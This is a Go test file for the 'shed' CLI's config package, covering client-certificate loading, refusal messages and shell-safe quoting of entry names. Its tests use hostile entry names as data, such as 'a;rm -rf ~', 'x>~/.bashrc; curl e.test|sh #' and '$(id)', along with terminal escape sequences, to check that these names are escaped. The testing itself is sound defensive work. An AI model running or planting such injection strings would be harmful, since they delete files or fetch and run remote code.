package config

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/charliek/shed/internal/clienttoken"
	"github.com/charliek/shed/internal/servertls"
)

// clientCertPEM makes a client certificate and key whose subject carries the
// given userId values (none: a certificate that names no user).
func clientCertPEM(t *testing.T, users ...string) (certPEM, keyPEM []byte) {
	t.Helper()
	return clientCertPEMFor(t, "SHA256:test", users...)
}

// clientCertPEMFor is clientCertPEM with the subject CN given: the SSH key
// fingerprint a server writes on a certificate it issues to that key.
func clientCertPEMFor(t *testing.T, cn string, users ...string) (certPEM, keyPEM []byte) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	subject := pkix.Name{CommonName: cn}
	for _, u := range users {
		subject.ExtraNames = append(subject.ExtraNames, pkix.AttributeTypeAndValue{Type: servertls.ClientUserOID, Value: u})
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject:      subject,
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, key.Public(), key)
	if err != nil {
		t.Fatal(err)
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		t.Fatal(err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}),
		pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
}

func writePair(t *testing.T, certPEM, keyPEM []byte) (certPath, keyPath string) {
	t.Helper()
	dir := t.TempDir()
	certPath, keyPath = filepath.Join(dir, "client.pem"), filepath.Join(dir, "client.key")
	if err := os.WriteFile(certPath, certPEM, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(keyPath, keyPEM, 0o600); err != nil {
		t.Fatal(err)
	}
	return certPath, keyPath
}

// TestLoadEntryCertificate is the one stored-certificate rule: a certificate
// is presented only when it names the entry's user or the implicit user; one
// that names no user, or a user the entry does not record, is refused; a
// malformed user attribute or a pair that does not load is an ordinary error
// (the caller re-enrols).
func TestLoadEntryCertificate(t *testing.T) {
	cases := []struct {
		name      string
		certUsers []string
		entryUser string
		want      string // "ok", "refused:<kind>", "error"
		kind      RefusalKind
	}{
		{"names the entry's user", []string{"pat"}, "pat", "ok", 0},
		{"the implicit user, entry records one", []string{servertls.ImplicitUserValue}, "pat", "ok", 0},
		{"the implicit user, entry records none", []string{servertls.ImplicitUserValue}, "", "ok", 0},
		{"names no user", nil, "", "refused", RefusedStoredNoUser},
		{"names no user, entry records one", nil, "pat", "refused", RefusedStoredNoUser},
		{"names a user the entry does not record", []string{"pat"}, "", "refused", RefusedStoredUserMismatch},
		{"names another user", []string{"admin"}, "pat", "refused", RefusedStoredUserMismatch},
		{"a malformed value", []string{"Pat"}, "pat", "error", 0},
		{"two attributes", []string{"pat", "pat"}, "pat", "error", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			certPEM, keyPEM := clientCertPEM(t, tc.certUsers...)
			certPath, keyPath := writePair(t, certPEM, keyPEM)
			e := &ServerEntry{AuthMode: AuthModeMTLS, ClientCertFile: certPath, ClientKeyFile: keyPath, User: tc.entryUser}
			cert, err := LoadEntryCertificate("", e)
			r, refused := AsEntryRefused(err)
			switch tc.want {
			case "ok":
				if err != nil || cert == nil {
					t.Fatalf("got (%v, %v), want the certificate", cert, err)
				}
			case "refused":
				if !refused || r.Kind != tc.kind || cert != nil {
					t.Fatalf("got (%v, %v), want refusal kind %d", cert, err, tc.kind)
				}
				if !clienttoken.IsRefusal(err) {
					t.Error("the refusal does not end a credential source (clienttoken.Refusal)")
				}
			case "error":
				if err == nil || refused || cert != nil {
					t.Fatalf("got (%v, %v), want an ordinary (re-enrol) error", cert, err)
				}
			}
		})
	}

	// A mixed pair — the certificate of one enrolment beside the key of
	// another, as an interrupted or concurrent write can leave it, or as an
	// unlocked reader can see one mid-write — is never presented, whatever
	// user either half is for: it is an ordinary error, and the entry re-enrols
	// under the held-user rule.
	t.Run("a mixed pair", func(t *testing.T) {
		t.Setenv("HOME", t.TempDir()) // the named load takes the credential lock under ~/.shed/creds
		certPEM, _ := clientCertPEM(t, "pat")
		_, otherKey := clientCertPEM(t, "pat")
		certPath, keyPath := writePair(t, certPEM, otherKey)
		for _, name := range []string{"", "srv"} {
			cert, err := LoadEntryCertificate(name, &ServerEntry{AuthMode: AuthModeMTLS,
				ClientCertFile: certPath, ClientKeyFile: keyPath, User: "pat"})
			if _, refused := AsEntryRefused(err); cert != nil || err == nil || refused {
				t.Fatalf("name %q: got (%v, %v), want an ordinary error and nothing to present", name, cert, err)
			}
		}
	})

	t.Run("no files on record", func(t *testing.T) {
		_, err := LoadEntryCertificate("", &ServerEntry{AuthMode: AuthModeMTLS})
		if _, refused := AsEntryRefused(err); err == nil || refused {
			t.Fatalf("err = %v, want an ordinary error", err)
		}
	})
}

// TestReadEntryCertificateIsTheSameCheck: the unlocked reader that `shed
// server list` and `shed server add` use for display gives, for every stored
// state, the answer LoadEntryCertificate gives (presented, refused with the
// same kind and entry name, or an ordinary error), and takes no lock: the
// credential store under HOME is never created.
func TestReadEntryCertificateIsTheSameCheck(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	_, mixedKey := clientCertPEM(t, "pat")
	cases := []struct {
		name      string
		certUsers []string
		mixed     bool
		entryUser string
	}{
		{"names the entry's user", []string{"pat"}, false, "pat"},
		{"the implicit user, entry records none", []string{servertls.ImplicitUserValue}, false, ""},
		{"the implicit user, entry records one", []string{servertls.ImplicitUserValue}, false, "pat"},
		{"names no user", nil, false, ""},
		{"names a user the entry does not record", []string{"pat"}, false, ""},
		{"names another user", []string{"admin"}, false, "pat"},
		{"a malformed value", []string{"Pat"}, false, "pat"},
		{"a mixed pair", []string{"pat"}, true, "pat"},
	}
	type answer struct {
		presented bool
		refused   RefusalKind
		entry     string
		failed    bool
	}
	answerOf := func(cert any, err error) answer {
		a := answer{presented: err == nil && cert != nil, failed: err != nil}
		if r, ok := AsEntryRefused(err); ok {
			a.refused, a.entry = r.Kind, r.Entry
		}
		return a
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			certPEM, keyPEM := clientCertPEM(t, tc.certUsers...)
			if tc.mixed {
				keyPEM = mixedKey
			}
			certPath, keyPath := writePair(t, certPEM, keyPEM)
			e := &ServerEntry{AuthMode: AuthModeMTLS, ClientCertFile: certPath, ClientKeyFile: keyPath, User: tc.entryUser}
			readCert, readErr := ReadEntryCertificate("srv", e)
			if _, err := os.Stat(GetCredsDir()); !errors.Is(err, os.ErrNotExist) {
				t.Fatalf("the unlocked read touched the credential store (%v)", err)
			}
			loadCert, loadErr := LoadEntryCertificate("srv", e)
			if got, want := answerOf(readCert, readErr), answerOf(loadCert, loadErr); got != want {
				t.Errorf("ReadEntryCertificate = %+v (%v), LoadEntryCertificate = %+v (%v)", got, readErr, want, loadErr)
			}
			// The locked load made the store; drop it for the next case.
			if err := os.RemoveAll(GetCredsDir()); err != nil {
				t.Fatal(err)
			}
		})
	}
}

// TestStoredCertificateIsHeldToTheIdentityFile (plan 037 P-a, held wherever a
// stored pair is loaded for use): for an entry with an identity_file, a stored
// certificate is presented only when it was made for that key (its subject is
// the key's fingerprint). One made for another key is the ordinary,
// re-enrol error, never a refusal and never presented; an identity file whose
// public key cannot be learned is its typed *IdentityFileError, nothing
// presented. Both readers (the locked load and the display read) answer
// alike. An entry with no identity_file reads no identity file and keeps
// today's answer for a certificate of any subject.
func TestStoredCertificateIsHeldToTheIdentityFile(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	k1, k2 := identityKey(t, dir, "id_old"), identityKey(t, dir, "id_work")
	fp := func(path string) string {
		t.Helper()
		k, err := IdentityFileKey("", path)
		if err != nil {
			t.Fatal(err)
		}
		return k
	}
	var reads int
	orig := storedCertKeyFn
	t.Cleanup(func() { storedCertKeyFn = orig })
	storedCertKeyFn = func(entry, path string) (string, error) {
		reads++
		return orig(entry, path)
	}
	entryFor := func(cn, identity string) *ServerEntry {
		certPEM, keyPEM := clientCertPEMFor(t, cn, "pat")
		certPath, keyPath := writePair(t, certPEM, keyPEM)
		return &ServerEntry{AuthMode: AuthModeMTLS, ClientCertFile: certPath, ClientKeyFile: keyPath,
			User: "pat", IdentityFile: identity}
	}
	readers := map[string]func(string, *ServerEntry) (*tls.Certificate, error){
		"LoadEntryCertificate": LoadEntryCertificate,
		"ReadEntryCertificate": ReadEntryCertificate,
	}
	for name, read := range readers {
		t.Run(name, func(t *testing.T) {
			// Made for the identity file's key: presented.
			if cert, err := read("srv", entryFor(fp(k2), k2)); err != nil || cert == nil {
				t.Fatalf("a certificate for the entry's key: presented=%t, err=%v; want it presented", cert != nil, err)
			}

			// Made for another key: not presented, an ordinary error.
			cert, err := read("srv", entryFor(fp(k1), k2))
			var ie *IdentityFileError
			if _, refused := AsEntryRefused(err); cert != nil || err == nil || refused || errors.As(err, &ie) {
				t.Fatalf("a certificate for another key: presented=%t, err=%v; want an ordinary (re-enrol) error", cert != nil, err)
			}
			if !strings.Contains(err.Error(), fp(k1)) || !strings.Contains(err.Error(), fp(k2)) {
				t.Errorf("message %q names neither key", err)
			}

			// The identity file is gone: its typed refusal, nothing presented.
			gone := filepath.Join(dir, "removed")
			cert, err = read("srv", entryFor(fp(k2), gone))
			if cert != nil || !errors.As(err, &ie) || ie.Entry != "srv" || !strings.Contains(ie.Reason, "does not exist") {
				t.Fatalf("an identity file that is gone: presented=%t, err=%v; want its typed refusal", cert != nil, err)
			}

			// No identity_file: no identity file is read, and a certificate
			// of any subject is presented as before.
			reads = 0
			if cert, err := read("srv", entryFor(fp(k1), "")); err != nil || cert == nil {
				t.Fatalf("no identity_file: presented=%t, err=%v; want the certificate as before", cert != nil, err)
			}
			if reads != 0 {
				t.Errorf("no identity_file: %d identity-file read(s), want none", reads)
			}
		})
	}
}

// TestIssuedCertificateUser: a newly issued certificate is read fail closed.
func TestIssuedCertificateUser(t *testing.T) {
	cases := []struct {
		name     string
		certPEM  []byte
		user     string
		implicit bool
		kind     RefusalKind
	}{
		{"named", mustCert(t, "pat"), "pat", false, 0},
		{"implicit", mustCert(t, servertls.ImplicitUserValue), "", true, 0},
		{"names no user", mustCert(t), "", false, RefusedIssuedNoUser},
		{"malformed", mustCert(t, "Pat"), "", false, RefusedIssuedUnreadable},
		{"two attributes", mustCert(t, "pat", "admin"), "", false, RefusedIssuedUnreadable},
		{"not a certificate", []byte("garbage"), "", false, RefusedIssuedUnreadable},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			user, implicit, refusal := IssuedCertificateUser("srv", tc.certPEM)
			if tc.kind != 0 {
				if refusal == nil || refusal.Kind != tc.kind {
					t.Fatalf("refusal = %v, want kind %d", refusal, tc.kind)
				}
				return
			}
			if refusal != nil || user != tc.user || implicit != tc.implicit {
				t.Fatalf("got (%q, %v, %v), want (%q, %v)", user, implicit, refusal, tc.user, tc.implicit)
			}
		})
	}
}

func mustCert(t *testing.T, users ...string) []byte {
	t.Helper()
	c, _ := clientCertPEM(t, users...)
	return c
}

func TestHeldUserAccepts(t *testing.T) {
	cases := []struct {
		held, user string
		implicit   bool
		want       bool
	}{
		{"", "pat", false, true},
		{"pat", "pat", false, true},
		{"pat", "", true, true},
		{"", "", true, true},
		{"pat", "admin", false, false},
	}
	for _, tc := range cases {
		if got := HeldUserAccepts(tc.held, tc.user, tc.implicit); got != tc.want {
			t.Errorf("HeldUserAccepts(%q, %q, %v) = %v, want %v", tc.held, tc.user, tc.implicit, got, tc.want)
		}
	}
}

// TestEntryRefusedMessages pins the texts the plan's upgrade steps quote.
func TestEntryRefusedMessages(t *testing.T) {
	cases := []struct {
		err  *EntryRefusedError
		want string
	}{
		{&EntryRefusedError{Entry: "shed", Kind: RefusedStoredNoUser},
			`entry "shed" cannot be used: its certificate names no user (issued by a shed-server older than 0.10.0); ` +
				`no request was sent. Enrol it again: shed server update shed --refetch`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedStoredUserMismatch, CertUser: "pat"},
			`entry "shed" cannot be used: its certificate is for user "pat" but the entry records no user ` +
				`(written by a shed CLI older than 0.10.0, edited by hand, or an interrupted or concurrent enrolment); ` +
				`no request was sent. Enrol it again: shed server update shed --refetch`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedStoredUserMismatch, CertUser: "pat", EntryUser: "admin"},
			`entry "shed" cannot be used: its certificate is for user "pat" but the entry records user "admin" ` +
				`(edited by hand, or an interrupted or concurrent enrolment); ` +
				`no request was sent. Enrol it again: shed server update shed --refetch`},
		{&EntryRefusedError{Kind: RefusedIssuedNoUser},
			`the server issued a certificate that names no user: it runs a shed-server older than 0.10.0; ` +
				`nothing was saved. Upgrade the server to 0.10.0, then retry.`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: "pat"},
			"the server issued a certificate for user \"admin\", but entry \"shed\" is held to user \"pat\"; nothing was saved.\n" +
				"ssh offered a key that belongs to \"admin\". To stay \"pat\", let this entry offer only the private key of user \"pat\" " +
				"(shed server update shed --identity-file /path/to/key, with that key's path in place of /path/to/key) and retry.\n" +
				"To make this entry \"admin\": shed server update shed --refetch --allow-user-change"},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedEntryChanged},
			`entry "shed" changed while this command ran; nothing was saved. Run it again.`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedEntryUserChanged, CertUser: "pat", EntryUser: "admin"},
			`entry "shed" now records user "admin", but this command was using it as user "pat" ` +
				`(another command changed the entry while this one ran); nothing was saved and this command's ` +
				`certificate is no longer used. Run the command again.`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedRestoreFailed, Cause: errors.New("disk full")},
			`entry "shed": a client certificate update did not complete and the previous certificate could not be put back (disk full); ` +
				`its certificate files and its recorded user may now disagree. Enrol it again: shed server update shed --refetch`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedEntryUnreadable, Cause: errors.New("permission denied")},
			`entry "shed" could not be verified against its recorded user and identity (permission denied); ` +
				`nothing was saved and this command's certificate is no longer used. ` +
				`Check config.yaml, the entry's credential files and identity_file, then run the command again.`},
		{&EntryRefusedError{Entry: "shed", Kind: RefusedUserNotRecorded, CertUser: "pat", Cause: errors.New("read-only file system")},
			`the server issued a certificate for user "pat", but entry "shed" could not be updated to record that user ` +
				`(read-only file system); the certificate was not used and nothing was kept. ` +
				`Make config.yaml and the entry's credential files writable, then run the command again.`},
	}
	for _, tc := range cases {
		if got := tc.err.Error(); got != tc.want {
			t.Errorf("message:\n got %q\nwant %q", got, tc.want)
		}
	}
	// Only the refusals that withdraw what a process holds end its source at
	// once, however valid its certificate. A row that cannot be read fails
	// closed; a first user that could not be recorded ends the command, which
	// then says why.
	for kind := RefusedStoredNoUser; kind <= RefusedUserNotRecorded; kind++ {
		want := kind == RefusedEntryUserChanged || kind == RefusedRestoreFailed ||
			kind == RefusedEntryUnreadable || kind == RefusedUserNotRecorded
		if got := (&EntryRefusedError{Kind: kind}).InvalidatesHeld(); got != want {
			t.Errorf("kind %d: InvalidatesHeld = %v, want %v", kind, got, want)
		}
	}
	unreadable := &EntryRefusedError{Kind: RefusedIssuedUnreadable, Cause: errors.New("bad DER")}
	if !strings.Contains(unreadable.Error(), "bad DER") || !errors.Is(unreadable, unreadable.Cause) {
		t.Errorf("the unreadable refusal does not carry its cause: %v", unreadable)
	}
}

// TestStoredTokenRefusalEscapesTheEntryName: an entry name edited by hand into
// config.yaml can hold an escape sequence; the stored-token refusal shows it
// escaped, and suggests no command line a person would paste with it.
func TestStoredTokenRefusalEscapesTheEntryName(t *testing.T) {
	name := "srv\x1b[31m"
	msg := StoredTokenRefusal(name, &ServerEntry{IdentityFile: "/home/pat/.ssh/id_work"}).Error()
	if strings.ContainsRune(msg, '\x1b') {
		t.Errorf("the refusal carries a raw ESC: %q", msg)
	}
	if strings.Contains(msg, "shed server update srv") {
		t.Errorf("the refusal suggests a command line with a name that cannot be pasted: %q", msg)
	}
	if !strings.Contains(msg, `run shed server update for the entry "srv\x1b[31m" with --refetch`) {
		t.Errorf("the advice does not name the entry escaped: %q", msg)
	}
}

// shellWordTable is the hand-written table of the pasteable-word rule that the
// Rust core's shell_server_name is held to as well.
const shellWordTable = "../../crates/fixtures/shellword/cases.json"

// TestShellWordSharedTable holds ShellWord to the one table both languages
// read (crates/fixtures/shellword/cases.json), so it cannot drift from the
// Rust core's shell_server_name: the same names are bare, quoted or refused.
func TestShellWordSharedTable(t *testing.T) {
	data, err := os.ReadFile(filepath.FromSlash(shellWordTable))
	if err != nil {
		t.Fatalf("read the shared table: %v", err)
	}
	var table struct {
		Cases []struct {
			Name string  `json:"name"`
			Word *string `json:"word"`
		} `json:"cases"`
	}
	if err := json.Unmarshal(data, &table); err != nil {
		t.Fatalf("decode %s: %v", shellWordTable, err)
	}
	if len(table.Cases) < 40 {
		t.Fatalf("the shared table holds only %d cases", len(table.Cases))
	}
	for _, tc := range table.Cases {
		got, ok := ShellWord(tc.Name)
		switch {
		case tc.Word == nil && ok:
			t.Errorf("ShellWord(%q) = %q, true; want no pasteable word", tc.Name, got)
		case tc.Word != nil && (!ok || got != *tc.Word):
			t.Errorf("ShellWord(%q) = %q, %v; want %q, true", tc.Name, got, ok, *tc.Word)
		}
	}
	// Bytes that are not UTF-8 cannot be written in the JSON table (nor held
	// by a Rust &str); Go refuses them like any other byte above 0x7E.
	for _, in := range []string{"a\xffb", "\xc3", "shed\xe0\xae"} {
		if got, ok := ShellWord(in); ok {
			t.Errorf("ShellWord(%q) = %q, true; want no pasteable word", in, got)
		}
	}
}

// shellSplit reads the command that starts at cmd the way a POSIX shell reads
// a pasted line: words split at unquoted blanks, `'…'` and `"…"` quoted, `\x`
// escaped, up to the first unquoted `,` or line break (where a message's
// sentence goes on) or the end. It returns the words and every character the
// shell would treat as syntax (outside quotes: a metacharacter, a glob, a
// tilde, a comment, a history or brace character; inside double quotes: an
// expansion). A safe suggestion has none.
func shellSplit(cmd string) (words []string, syntax string) {
	const meta = "|&;<>()$`*?[]#~!{}\t"
	var (
		word    strings.Builder
		inWord  bool
		quote   rune
		escaped bool
	)
	flush := func() {
		if inWord {
			words = append(words, word.String())
		}
		word.Reset()
		inWord = false
	}
	for _, c := range cmd {
		switch {
		case escaped:
			word.WriteRune(c)
			escaped = false
		case quote == '\'':
			if c == '\'' {
				quote = 0
			} else {
				word.WriteRune(c)
			}
		case quote == '"':
			switch c {
			case '"':
				quote = 0
			case '$', '`', '\\':
				syntax += string(c)
				word.WriteRune(c)
			default:
				word.WriteRune(c)
			}
		case c == '\'' || c == '"':
			quote, inWord = c, true
		case c == '\\':
			// An escaped character is literal (the `\'` of `'\''`).
			escaped, inWord = true, true
		case c == ' ':
			flush()
		case c == ',' || c == '\n':
			flush()
			return words, syntax
		default:
			if strings.ContainsRune(meta, c) {
				syntax += string(c)
			}
			word.WriteRune(c)
			inWord = true
		}
	}
	if quote != 0 || escaped {
		syntax += "<unterminated>"
	}
	flush()
	return words, syntax
}

// suggestedCommands returns each `shed server update` command line msg
// suggests, from its first word to where the sentence goes on. The advice in
// words ("run shed server update for the entry …") is not a command line.
func suggestedCommands(msg string) []string {
	const cmd = "shed server update "
	var out []string
	for i := 0; ; {
		j := strings.Index(msg[i:], cmd)
		if j < 0 {
			return out
		}
		at := i + j
		if !strings.HasSuffix(msg[:at], "run ") {
			out = append(out, msg[at:])
		}
		i = at + len(cmd)
	}
}

// TestRefusalsNeverPrintAHostileEntryName: every refusal that suggests a
// command naming the entry shows the name escaped, quotes it for the shell
// when it can be pasted as one word, and otherwise gives the advice in words
// with no command line. A hand-edited name with a line break, an ESC
// sequence, a `;` or a leading `-` never reaches the terminal raw and is never
// pasteable as something else. Each suggested command is split as a shell
// would split it: it is exactly the intended argv, with no shell syntax.
func TestRefusalsNeverPrintAHostileEntryName(t *testing.T) {
	kinds := []struct {
		name  string
		err   func(entry string) *EntryRefusedError
		forms []updateForm
	}{
		{"stored no user", func(n string) *EntryRefusedError {
			return &EntryRefusedError{Entry: n, Kind: RefusedStoredNoUser}
		}, []updateForm{updateRefetch}},
		{"stored user mismatch", func(n string) *EntryRefusedError {
			return &EntryRefusedError{Entry: n, Kind: RefusedStoredUserMismatch, CertUser: "pat"}
		}, []updateForm{updateRefetch}},
		{"issued user change", func(n string) *EntryRefusedError {
			return &EntryRefusedError{Entry: n, Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: "pat"}
		}, []updateForm{updateIdentityFile, updateAllowUserChange}},
		{"restore failed", func(n string) *EntryRefusedError {
			return &EntryRefusedError{Entry: n, Kind: RefusedRestoreFailed, Cause: errors.New("disk full")}
		}, []updateForm{updateRefetch}},
		{"mint-only unrecorded", func(n string) *EntryRefusedError {
			return &EntryRefusedError{Entry: n, Kind: RefusedMintOnlyUnrecorded, CertUser: "pat"}
		}, []updateForm{updateRefetch}},
		{"stored token for key", func(n string) *EntryRefusedError {
			return StoredTokenRefusal(n, &ServerEntry{IdentityFile: "/home/pat/.ssh/id_work"})
		}, []updateForm{updateRefetch}},
	}
	formArgv := map[updateForm][]string{
		updateRefetch:         {"--refetch"},
		updateIdentityFile:    {"--identity-file", "/path/to/key"},
		updateAllowUserChange: {"--refetch", "--allow-user-change"},
	}
	for _, k := range kinds {
		t.Run(k.name, func(t *testing.T) {
			// Names a pasted word can carry: each suggested command is exactly
			// `shed server update <name> <form>`, with no shell syntax.
			for _, entry := range []string{"shed", "a;rm -rf ~", "x>~/.bashrc; curl e.test|sh #", "it's", "a,b) ; id"} {
				msg := k.err(entry).Error()
				cmds := suggestedCommands(msg)
				if len(cmds) != len(k.forms) {
					t.Fatalf("%q: %d suggested commands, want %d: %q", entry, len(cmds), len(k.forms), msg)
				}
				for i, cmd := range cmds {
					words, syntax := shellSplit(cmd)
					if syntax != "" {
						t.Errorf("%q: the suggested command holds shell syntax %q: %q", entry, syntax, cmd)
					}
					want := append([]string{"shed", "server", "update", entry}, formArgv[k.forms[i]]...)
					if !slices.Equal(words, want) {
						t.Errorf("%q: a shell reads the suggested command as %q, want %q (%q)", entry, words, want, cmd)
					}
				}
			}

			// Names no pasted word can carry: the advice in words, the name escaped.
			for _, hostile := range []string{"a\nb", "srv\x1b[2J", "-oProxyCommand=x", "shedா"} {
				msg := k.err(hostile).Error()
				if strings.ContainsAny(hostile, "\n\x1b") && strings.Contains(msg, hostile) {
					t.Errorf("%q reached the message raw: %q", hostile, msg)
				}
				if strings.ContainsRune(msg, '\x1b') {
					t.Errorf("%q: a raw ESC in the message: %q", hostile, msg)
				}
				if cmds := suggestedCommands(msg); len(cmds) != 0 {
					t.Errorf("%q: a command line names it: %q", hostile, cmds)
				}
				if want := fmt.Sprintf("run shed server update for the entry %q with --", hostile); !strings.Contains(msg, want) {
					t.Errorf("%q: the advice in words is missing (%q): %q", hostile, want, msg)
				}
			}
		})
	}

	// The user an entry is held to also comes from config.yaml: it is named
	// escaped in the sentence and never reaches a suggested command, whose key
	// path is a fixed placeholder (the review's held-user value).
	for _, held := range []string{"x>~/.bashrc; curl e.test|sh #", "pat\x1b[2J", "pat'$(id)"} {
		msg := (&EntryRefusedError{Entry: "shed", Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: held}).Error()
		if strings.ContainsRune(msg, '\x1b') {
			t.Errorf("the held user reached the message raw: %q", msg)
		}
		if !strings.Contains(msg, fmt.Sprintf("only the private key of user %q (", held)) {
			t.Errorf("the sentence does not name the held user escaped: %q", msg)
		}
		cmds := suggestedCommands(msg)
		if len(cmds) != 2 {
			t.Fatalf("%d suggested commands, want 2: %q", len(cmds), msg)
		}
		for i, cmd := range cmds {
			words, syntax := shellSplit(cmd)
			want := append([]string{"shed", "server", "update", "shed"}, formArgv[[]updateForm{updateIdentityFile, updateAllowUserChange}[i]]...)
			if syntax != "" || !slices.Equal(words, want) {
				t.Errorf("held user %q: a shell reads the suggested command as %q (syntax %q), want %q: %q",
					held, words, syntax, want, cmd)
			}
		}
	}
}

// TestShellSplitCatchesTheOldInterpolation is the splitter's negative
// control: the command the held-user refusal built before (the held user in
// the key path) is caught, and so is an unquoted name.
func TestShellSplitCatchesTheOldInterpolation(t *testing.T) {
	for _, cmd := range []string{
		"shed server update shed --identity-file <x>~/.bashrc; curl e.test|sh #'s private key>) and retry.",
		"shed server update a;rm -rf ~ --refetch",
		"shed server update shed --identity-file <key>",
		`shed server update "a$(id)" --refetch`,
	} {
		if _, syntax := shellSplit(cmd); syntax == "" {
			t.Errorf("shellSplit(%q) found no shell syntax", cmd)
		}
	}
	words, syntax := shellSplit("shed server update 'it'\\''s' --refetch, then")
	if syntax != "" || !slices.Equal(words, []string{"shed", "server", "update", "it's", "--refetch"}) {
		t.Errorf("shellSplit of a quoted word = %q, syntax %q", words, syntax)
	}
}
